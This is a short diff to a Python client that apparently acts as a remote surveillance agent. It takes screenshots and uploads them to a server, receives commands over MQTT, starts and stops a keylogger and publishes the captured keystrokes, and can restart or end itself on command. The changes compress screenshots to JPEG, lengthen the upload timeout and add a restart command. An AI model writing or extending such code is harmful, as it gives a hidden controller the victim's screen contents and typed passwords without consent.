@@ -63,10 +63,11 @@ ACK_TOPIC = f"ack/{pc_id}"
 # Screenshot
 def take_screenshot():
     try:
-        filename = f"{pc_name}_screenshot.png"
-        pg.screenshot(filename)
+        filename = f"{pc_name}_screenshot.jpg"
+        screenshotVar = pg.screenshot()
+        screenshotVar.save(filename,quality=50)
         with open(filename, "rb") as f:
-            requests.post(f"{serverUrl}/upload", files={"screenshot": f}, timeout=5)
+            requests.post(f"{serverUrl}/upload", files={"screenshot": f}, timeout=(30))
             client.publish(ACK_TOPIC,f"Screenshot Captured Of Pc : {pc_id}")
         os.remove(filename)
     except Exception as e:
@@ -138,7 +139,9 @@ def handle_msg(msg):
             client.publish(ACK_TOPIC,"Started Logging")
         elif msg == "stopkeylog":
             data = stop_logging()
-            client.publish(ACK_TOPIC,f"Logged data of : {pc_id} : {data}")      
+            client.publish(ACK_TOPIC,f"Logged data of : {pc_id} : {data}")   
+        elif msg == "restart":
+            os.execv(sys.executable,sys.argv)     
         elif msg == "end":
             os._exit(0)
         elif msg.startswith("browser"):
